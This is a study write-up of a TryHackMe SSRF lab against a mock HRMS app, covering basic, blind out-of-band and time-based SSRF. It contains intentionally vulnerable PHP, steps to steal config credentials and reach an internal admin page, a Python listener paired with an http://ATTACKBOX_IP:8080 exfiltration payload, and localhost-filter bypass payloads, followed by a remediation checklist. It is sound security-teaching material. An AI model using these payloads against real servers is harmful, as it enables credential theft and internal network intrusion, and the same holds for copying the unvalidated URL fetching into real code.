# SSRF — Server-Side Request Forgery

> TryHackMe Lab: HRMS Application  
> Module covers: Basic SSRF, Blind SSRF, Out-of-Band, Time-Based, Remediation

---

## 🔍 What is SSRF?

SSRF (Server-Side Request Forgery) occurs when an attacker tricks a **server** into making HTTP requests **on their behalf** — to internal services, localhost, or other back-end systems the attacker cannot reach directly.

> **Key idea:** You aren't attacking the server directly. You're using the server as a proxy to attack *other* things.

**OWASP Ranking:** #10 in OWASP Top 10 (2021), #7 in OWASP API Security Top 10 (2023)

---

## ⚠️ Why SSRF is Dangerous

| Risk | Description |
|------|-------------|
| **Data Exposure** | Access sensitive files or internal services |
| **Reconnaissance** | Port scan internal network via server |
| **Denial of Service** | Flood low-bandwidth internal servers |

---

## 🧠 SSRF Attack Types

### 1. Basic SSRF — Against Local Server

**Scenario:** The app uses a `?url=` parameter to load internal pages.

**Vulnerable URL pattern:**
```
http://hrms.thm/?url=localhost/copyright
```

**Vulnerable PHP Code:**
```php
$uri = rtrim($_GET['url'], "/");
// No validation — loads any file from localhost!
if (file_exists($path)) {
    echo htmlspecialchars(file_get_contents($path));
}
```

**Exploitation:**
```
http://hrms.thm/?url=localhost/config
→ Reveals: $adminURL, $username, $password from config.php
```

**Why it works:** No input sanitisation on the `url` parameter — the server will read any local file you name.

---

### 2. Basic SSRF — Against Internal Server

**Scenario:** The dashboard fetches employee data from a private IP (`192.168.2.10`) that you can't access directly.

**Steps:**
1. Log in using credentials stolen from `config.php`
2. Open browser DevTools → Inspect the salary dropdown
3. Change the dropdown `value` from:
   ```
   http://192.168.2.10/salary.php
   ```
   to:
   ```
   http://192.168.2.10/admin.php
   ```
4. Select the option — the server fetches `admin.php` on your behalf!

**Why it works:** The server makes the HTTP request internally, bypassing the firewall that blocks *your* direct access.

---

### 3. Blind SSRF — Out-of-Band (OOB)

**Scenario:** The app sends data to an external URL but shows you *nothing* in the browser response.

**Vulnerable PHP Code:**
```php
$targetUrl = $_GET['url'];
phpinfo();  // collects server info
$ch = curl_init($targetUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $phpInfoData);
curl_exec($ch);  // sends phpinfo() to YOUR server!
```

**Exploitation Steps:**

**Step 1 — Start a listener on your AttackBox:**
```python
# server.py
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CustomRequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        self.send_response(200)
        self.end_headers()
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')

if __name__ == '__main__':
    httpd = HTTPServer(('', 8080), CustomRequestHandler)
    httpd.serve_forever()
```

```bash
sudo python3 server.py
```

**Step 2 — Trigger the SSRF:**
```
http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080
```

**Step 3 — Read the stolen data:**
```bash
cat data.html   # Contains full phpinfo() output — PHP version, modules, env vars, etc.
```

**Why it works:** You never see the server's response directly, but it *phones home* to you with its own data.

---

### 4. Semi-Blind SSRF — Time-Based

**How it works:**
- Send requests targeting different internal URLs
- Measure response time for each
- A **significantly longer response** = server successfully reached that resource
- A **timeout or fast error** = resource doesn't exist or is blocked

**Use case:** Enumerate internal ports/services without seeing any response content.

---

## 🛡️ Remediation Checklist

```
[ ] Validate & sanitise ALL URL/path input parameters
[ ] Use ALLOWLISTS — only permit known trusted domains/IPs
[ ] Never use blocklists alone (bypass is trivial)
[ ] Network segmentation — isolate internal services
[ ] Add Content-Security-Policy headers
[ ] Enforce access controls on internal endpoints
[ ] Log and monitor outbound server requests
[ ] Disable unnecessary URL-fetching features
```

---

## 🧪 Quick Reference — Attack Payloads

```bash
# Local file read
http://hrms.thm/?url=localhost/config
http://hrms.thm/?url=localhost/admin

# Internal network access
http://hrms.thm/?url=http://192.168.2.10/admin.php
http://hrms.thm/?url=http://10.0.0.1/dashboard

# OOB data exfiltration
http://hrms.thm/profile.php?url=http://YOUR_IP:8080

# Bypass localhost filters (common tricks)
http://hrms.thm/?url=http://127.0.0.1/config
http://hrms.thm/?url=http://[::1]/config
http://hrms.thm/?url=http://0.0.0.0/config
```

---

## 📌 Key Takeaways

- SSRF = **server acts as your proxy** to reach otherwise inaccessible resources
- Basic SSRF gives **direct responses**; Blind SSRF requires out-of-band techniques
- Config files (`config.php`, `.env`) are **prime targets** in local SSRF
- Internal admin panels on **RFC 1918 addresses** are typical targets in network SSRF
- Time-based SSRF is useful for **port enumeration** when no output is returned
- Allowlisting > Blocklisting for mitigation

---

## 🔗 References

- [OWASP SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP API Security Top 10 - A7](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [TryHackMe SSRF Room](https://tryhackme.com)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
